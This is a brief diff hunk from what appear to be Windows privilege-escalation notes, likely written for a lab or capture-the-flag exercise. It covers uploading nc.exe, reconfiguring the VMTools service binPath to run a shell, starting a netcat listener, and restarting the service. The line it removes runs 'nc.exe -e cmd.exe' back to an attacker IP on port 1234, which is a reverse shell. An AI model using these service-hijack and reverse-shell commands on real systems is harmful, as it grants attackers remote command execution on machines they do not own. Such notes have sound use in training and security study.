@@ -217,10 +217,9 @@ services
 
 upload nc.exe
 
-sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.168.1.205 1234"
-
 sc.exe config VMTools binPath="C:\temp\shell.exe"
 
+# lhost
 nc -vnlp 1234
 
 sc.exe stop VMTools
